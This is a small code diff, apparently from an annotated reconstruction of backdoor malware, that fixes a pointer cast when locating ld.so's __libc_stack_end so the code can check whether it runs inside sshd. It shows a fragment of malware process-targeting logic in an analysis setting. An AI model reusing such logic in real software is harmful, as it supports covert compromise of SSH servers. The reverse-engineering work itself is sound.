@@ -26,7 +26,7 @@ BOOL main_elf_parse(main_elf_t *main_elf)
      libc_stack_end_sym != (Elf64_Sym *)0x0)) {
     elf = main_elf->elf_handles->ldso;
     // AutoDoc: Convert the symbol's st_value into a pointer inside ld.so's ELF image (double indirection).
-    libc_stack_end_ptr = elf->elfbase->e_ident + libc_stack_end_sym->st_value;
+    libc_stack_end_ptr = (void **)((u8 *)elf->elfbase + libc_stack_end_sym->st_value);
     // AutoDoc: Use `__libc_stack_end` to read sshd's argv/envp pointer and confirm the process really is sshd.
     parse_ok = process_is_sshd(elf,*(u8 **)libc_stack_end_ptr);
     if (parse_ok != FALSE) {
